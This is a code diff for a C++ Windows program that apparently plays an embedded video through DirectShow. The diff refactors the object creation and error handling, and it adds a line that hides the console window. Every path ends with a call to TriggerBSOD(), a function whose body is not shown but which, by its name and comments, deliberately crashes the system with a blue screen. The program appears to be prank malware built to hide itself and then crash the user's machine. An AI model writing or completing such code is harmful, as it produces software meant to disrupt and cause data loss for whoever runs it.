@@ -70,12 +70,11 @@ void InitializeDirectShow(LPCWSTR path) {
 
     // Create DirectShow objects
     graph.reset();
-
-    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
-
     control.reset();
     event.reset();
     window.reset();
+
+    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
 
     graph->QueryInterface(IID_IMediaControl, (void**)&control);
     graph->QueryInterface(IID_IMediaEvent, (void**)&event);
@@ -90,16 +89,20 @@ void InitializeDirectShow(LPCWSTR path) {
 
 int main() {
     LPWSTR path;
+    
+    HRESULT result;
+	LONG code;
+
+    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide console window
 
     GetVideoResource(&path); // Get the video resource
     InitializeDirectShow(path); // Initialize DirectShow
 
-    try {
-        control->Run(); // Play the video
-        event->WaitForCompletion(INFINITE, nullptr); // Wait for video to finish
-    } catch (const std::exception& e) {
-        TriggerBSOD(); // If exception occurs, trigger BSoD
-    }
+    result = control->Run(); // Play the video
+
+	if (SUCCEEDED(result)) {
+		event->WaitForCompletion(INFINITE, &code); // Wait for the video to finish
+	}
 
     // Trigger BSoD after attempting to play the video
     TriggerBSOD();
